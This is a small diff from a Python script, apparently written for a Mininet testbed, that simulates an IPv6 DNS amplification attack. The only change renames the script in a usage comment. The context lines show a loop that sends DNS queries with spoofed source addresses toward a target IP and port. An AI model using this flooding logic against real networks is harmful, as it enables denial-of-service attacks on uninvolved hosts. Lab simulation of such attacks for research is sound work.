@@ -21,7 +21,7 @@ def simulate_attack(target_ip, target_port, num_fake_ips, packets_per_ip):
         for _ in range(packets_per_ip):
             packet = create_dns_query_packet(fake_ip, target_ip, target_port)
             send(packet, verbose=False)
-# h1 python /mininet/host-service/dns-reverse.py 2001:1:2::1 5001 100 10
+# h1 python /mininet/host-service/dns-reflect.py 2001:1:2::1 5001 100 10
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Simulate a DNS Amplification Attack using IPv6.")
     parser.add_argument("target_ip", help="Target IPv6 address")
